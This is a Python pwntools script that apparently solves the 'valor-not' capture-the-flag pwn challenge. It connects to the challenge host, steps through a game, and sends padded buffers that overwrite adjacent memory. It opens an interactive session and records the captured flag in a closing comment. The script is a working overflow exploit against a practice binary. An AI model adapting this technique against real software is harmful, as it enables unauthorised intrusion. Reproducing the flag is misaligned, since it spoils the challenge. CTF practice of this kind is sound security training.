#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='amd64')
context.log_level = logging.DEBUG
context.terminal = ['tmux', 'splitw', '-h']
exe = './valor-not_dbg'

host = args.HOST or 'valornt.chal.pwni.ng'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


gdbscript = '''
b valor-not.c:187
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

for i in range(7):
    io.sendlineafter(b'weapon: \n', b'3')
    if i == 0:
        io.sendlineafter(b'win!!\n', b'y')

        b = b"cheater"
        b += p8(0x41) * (0x63 - len(b))
        io.sendlineafter(b'leave?\n', b)

        io.sendlineafter(b'ed\n', b'y')

        msg = b'B' * 0x64 + p32(1)
        io.sendlineafter(b'leave?\n', msg)
    elif i % 2 == 0:
        io.sendlineafter(b'win!!\n', b'n')
    else:
        io.sendlineafter(b'time\n', b'n')

io.sendlineafter(b'offs?', b'y')

msg = b'A' * (0x63 - len("heck")) + b'heck'
io.sendlineafter(b'leave?\n', msg)

io.interactive()

# pctf{thi5_i5_n07_7h3_righ7_ph4n70m_wh00p5_65ccae30}
